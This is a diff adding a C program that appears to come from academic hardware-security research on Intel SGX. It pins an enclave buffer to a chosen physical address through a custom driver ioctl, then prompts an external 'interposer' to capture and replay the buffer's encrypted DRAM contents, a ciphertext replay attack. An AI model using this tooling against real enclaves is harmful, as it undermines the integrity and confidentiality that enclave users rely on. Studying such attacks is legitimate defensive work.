@@ -1,0 +1,124 @@
+#include <sgx_urts.h>
+#include "Enclave/encl_u.h"
+#include <unistd.h>
+#include <stdbool.h>
+#include <sys/ioctl.h>
+#include <sys/param.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include "libsgxstep/pt.h"
+#include "libsgxstep/debug.h"
+
+#include "readalias.h"
+#include "mem_range_repo.h"
+#include "helpers.h"
+
+#define DBG_ENCL           1
+#define ALIAS_BIT          34
+#define ALLOC_SIZE         1*PAGE_SIZE
+
+
+sgx_enclave_id_t eid = 0;
+unsigned char epc_buf1[ALLOC_SIZE], epc_buf2[ALLOC_SIZE];
+
+#define SGX_MAGIC 0xA4
+
+#define SGX_IOC_EPC_PAGE_ADDR \
+        _IOW(SGX_MAGIC, 0x00, struct sgx_epc_page_addr)
+
+struct sgx_epc_page_addr  {
+        unsigned long   pa;
+        int alloc_nb;
+} __attribute__((__packed__));
+
+// Hacky method to avoid linking problems :)
+void* sgx_get_aep(void)
+{
+    return NULL;
+}
+void sgx_set_aep(void* aep)
+{
+}
+void* sgx_get_tcs(void)
+{
+    return NULL;
+}
+
+page_stats_t stats;
+
+int main( int argc, char **argv )
+{
+    if(argc != 2 ) {
+        printf("Usage: ./app <buffer address>\n");
+        return -1;
+    }
+
+    info_event("Opening driver...");
+    if (open_kmod()) {
+        err_log("Error: Unable to open driver.\n");
+        return -1;
+    }
+
+    int sgx_fd;
+
+    // Open the SGX driver
+    sgx_fd = open("/dev/isgx", O_RDWR);
+    if (sgx_fd < 0) {
+        perror("Failed to open /dev/isgx\n");
+        return -1;
+    }
+
+    struct sgx_epc_page_addr args;
+    unsigned long victim_pa;
+    if( do_stroul(argv[1], 0, &victim_pa)) {
+        err_log("failed to parse '%s' as victim_pa\n", argv[1]);
+        return -1;
+    }
+    args.pa = victim_pa;
+
+    // TODO: This may have to be changed, this is the allocation number that
+    // corresponds to the buffer (e.g., currently the 44th page for this enclave
+    // will be allocated at `victim_pa`).
+    args.alloc_nb = 43;
+
+    // Pass the victim_pa and allocation number on to the SGX driver
+    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);
+
+    info_event("Creating enclave...");
+    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/DBG_ENCL,
+                                    NULL, NULL, &eid, NULL ) );
+
+    // Get the va of the buffer and translate it to its pa
+    unsigned char *buffer;
+    SGX_ASSERT( initialize_buffer(eid) );
+    SGX_ASSERT( get_buffer_addr(eid, (void*)&buffer) );
+
+    address_mapping_t *map = get_mappings(buffer);
+    uint64_t pa = phys_address(map, PAGE);
+   
+    printf("\nBuffer allocated at va=0x%lx -- pa=0x%lx\n", buffer, pa);
+
+
+    // Flush buffer before capturing to ensure it comes from DRAM
+    SGX_ASSERT( flush_buffer(eid) );
+    
+    printf("Enable interposer and press enter to capture ciphertext\n");
+    getchar();
+
+    SGX_ASSERT( capture_buffer(eid) );
+
+    printf("Enable interposer and press enter to replay ciphertext\n");
+    getchar();
+
+    SGX_ASSERT( replay_buffer(eid) );
+
+    printf("Disable interposer and press enter to destroy this enclave\n");
+    getchar();
+
+    SGX_ASSERT( sgx_destroy_enclave( eid ) );
+
+    info_event("Done.");
+
+    return 0;
+}
